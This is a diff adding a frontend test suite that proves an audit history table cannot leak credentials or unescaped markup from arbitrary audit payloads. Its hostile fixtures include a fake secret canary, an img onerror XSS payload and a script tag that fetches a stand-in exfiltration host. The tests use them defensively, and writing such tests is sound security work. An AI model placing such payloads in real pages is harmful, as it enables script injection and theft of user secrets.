@@ -913,3 +913,164 @@ describe('managed secrets', () => {
     expect(screen.getByText(/^Configured$/)).toBeInTheDocument();
   });
 });
+
+/**
+ * The audit table is the one control-plane surface fed by data the client did
+ * not shape, so it is the one worth proving cannot leak.
+ *
+ * `before` and `after` are `unknown` on the wire. The backend writes only safe
+ * projections today, and the client is nonetheless written as if it does not:
+ * it renders a closed vocabulary of summaries and never stringifies the JSON it
+ * was handed. That decision is invisible in the code — `stateSummary` returning
+ * a translated string looks like a formatting choice — so without a test it
+ * survives exactly until somebody "improves" it into
+ * `JSON.stringify(event.before)` to show operators more detail.
+ *
+ * These fixtures are what such a change would leak: a recognizable credential
+ * canary planted in every shape a regression could reach it through — an
+ * unknown `kind`, a known `kind` carrying extra fields, a nested object, an
+ * array, a bare string, and markup that would matter if any of it were ever
+ * written as HTML.
+ */
+describe('the audit table cannot render arbitrary audit data', () => {
+  /**
+   * One string, distinctive enough that finding it anywhere in the document is
+   * unambiguous, and shaped like the thing whose exposure would actually
+   * matter.
+   */
+  const CANARY = 'sk-live-AUDITCANARY-9f3c2a71b4e8-do-not-render';
+
+  const event = (
+    id: string,
+    before: unknown,
+    after: unknown,
+  ): Record<string, unknown> => ({
+    id,
+    occurredAt: '2026-08-24T12:00:00.000Z',
+    actorUserId: 'user_1',
+    resource: 'runtimeSetting',
+    action: 'runtimeSetting.set',
+    resourceKey: 'knowledge.retrieval_max_chunks',
+    organizationId: null,
+    before,
+    after,
+  });
+
+  /**
+   * Every route the canary could travel, in one page.
+   *
+   * Listed exhaustively rather than as one representative case because the
+   * regressions differ: an unknown `kind` is what a *new backend projection*
+   * looks like to an old client, extra fields on a known `kind` are what a
+   * widened projection looks like, and a bare string or an array is what a bug
+   * or an attacker writing straight to the column looks like.
+   */
+  const HOSTILE = [
+    // A shape this client has never been taught, which is the case the
+    // fall-through summary exists for.
+    event('audit_unknown_kind', null, { kind: 'somethingNew', secret: CANARY }),
+    // A known kind that grew a field. The summary must read the fields it
+    // knows and ignore the rest rather than widening to whatever arrived.
+    event(
+      'audit_widened_known_kind',
+      { kind: 'runtimeSettingValue', redacted: true, value: CANARY },
+      { kind: 'runtimeSettingValue', redacted: false, value: CANARY },
+    ),
+    event(
+      'audit_secret_slot',
+      { kind: 'managedSecretSlot', configured: false },
+      { kind: 'managedSecretSlot', configured: true, plaintext: CANARY },
+    ),
+    event(
+      'audit_flag_note',
+      { kind: 'featureFlagOverride', enabled: false, note: CANARY },
+      { kind: 'featureFlagOverride', enabled: true, note: CANARY },
+    ),
+    // Nested and inside an array: a stringify would find both.
+    event('audit_nested', { deep: { deeper: [{ leaked: CANARY }] } }, [CANARY]),
+    // Not an object at all.
+    event('audit_primitive', CANARY, 42),
+    // Markup, so the assertion on `innerHTML` is about escaping too and not
+    // only about the absence of a substring.
+    event(
+      'audit_markup',
+      `<img src=x onerror="alert('${CANARY}')">`,
+      `<script>fetch('https://exfil.test/${CANARY}')</script>`,
+    ),
+  ];
+
+  beforeEach(() => {
+    listControlPlaneAudit.mockResolvedValue({
+      items: HOSTILE,
+      nextCursor: null,
+    });
+  });
+
+  it('never puts audit payload data into the DOM', async () => {
+    allowGlobalPermissions('controlPlane:read');
+
+    renderWithProviders(<ControlPlaneBlock />);
+    await screen.findByText('agents.enabled');
+    await openTab(/audit history/i);
+
+    // The table did render, so the assertions below are about a page that
+    // received every hostile row rather than about an empty panel.
+    expect(await screen.findAllByText(/set runtime setting/i)).toHaveLength(
+      HOSTILE.length,
+    );
+
+    expect(document.body.innerHTML).not.toContain(CANARY);
+    expect(document.body.textContent).not.toContain(CANARY);
+
+    // The markup fixture would have to be escaped to be safe; not being there
+    // at all is stronger, and this says which of the two happened.
+    expect(document.body.innerHTML).not.toContain('onerror');
+    expect(document.body.querySelector('script')).toBeNull();
+    expect(document.body.querySelector('img')).toBeNull();
+  });
+
+  /**
+   * The other half of the claim, and the half that stops the first from being
+   * satisfiable by rendering nothing.
+   *
+   * A closed projection means every row still says something true about what
+   * changed — drawn from the client's own translated vocabulary rather than
+   * from the payload.
+   */
+  it('still summarises each change from its own closed vocabulary', async () => {
+    allowGlobalPermissions('controlPlane:read');
+
+    renderWithProviders(<ControlPlaneBlock />);
+    await screen.findByText('agents.enabled');
+    await openTab(/audit history/i);
+
+    await screen.findAllByText(/set runtime setting/i);
+
+    const { english } = await import('@/test/render');
+    const vocabulary: string[] = Object.values(
+      english.ControlPlane.audit.state,
+    );
+
+    // The last cell of each body row is the change column. Read off the DOM
+    // rather than by matching expected text, so a row that rendered something
+    // outside the vocabulary is caught rather than merely not found.
+    const summaries = screen
+      .getAllByRole('row')
+      .slice(1)
+      .map((row) => {
+        const cells = row.querySelectorAll('td');
+
+        return cells[cells.length - 1]?.textContent ?? '';
+      });
+
+    expect(summaries).toHaveLength(HOSTILE.length);
+
+    for (const summary of summaries) {
+      const parts = summary.split('→').map((part) => part.trim());
+
+      expect(parts).toHaveLength(2);
+
+      for (const part of parts) expect(vocabulary).toContain(part);
+    }
+  });
+});
